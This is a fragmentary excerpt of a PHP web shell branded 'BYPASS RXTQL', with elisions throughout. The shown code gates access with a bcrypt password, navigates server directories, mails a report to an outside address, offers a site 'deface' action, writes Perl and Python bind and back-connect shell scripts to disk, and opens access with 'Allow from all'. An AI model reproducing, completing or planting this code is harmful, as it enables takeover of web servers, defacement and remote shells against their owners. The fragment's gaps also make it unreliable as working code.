...
// $GLOBALS['fungsi'][0]
	...
	$gcw = "getcwd";
	$correctPassword = '$2y$10$AF7a6/rj8ZWgF3I7i2uvieYi33Lt7oD/RRa4zq4putwSe/D455uxO'; // hash bcrypt
    if (isset($_POST['pass'])) {
	...
	<style>
    body {
        background-image: url("https://i.gifer.com/embedded/download/72TQ.gif");
	...
	<div class='py-3' id='main'>
		<div class='box shadow bg-dark p-4 rounded-3'>
			<a class='text-decoration-none text-light anu' href='".$_SERVER['PHP_SELF']."'><h4>BYPASS RXTQL</h4></a>";
			if(isset($_7['path'])){
				$path = unhex($_7['path']);
				chdir($path);
			}else{
		...
		@mail('google@gmail.com', '', $report_bug);
		}
		if($_7['id'] == 'deface'){
		...
		if($_7['bpl']){
			$bp = $GLOBALS['fungsi'][6]("");
			$brt = @fopen('bp.pl','w');
			fwrite($brt,$bp);
		...
		if($_7['bc'] == 'perl'){
			$bc = $GLOBALS['fungsi'][6]("");
			$plbc = @fopen('bc.pl','w');
			fwrite($plbc,$bc);
		...
		if($_7['bc'] == 'python'){
			$bc_py = $GLOBALS['fungsi'][6]("");
...
Allow from all
		...
		</div><div class='text-secondary'>BYPASS RXTQL</div>
	</div>
</div>
</body>
</html>
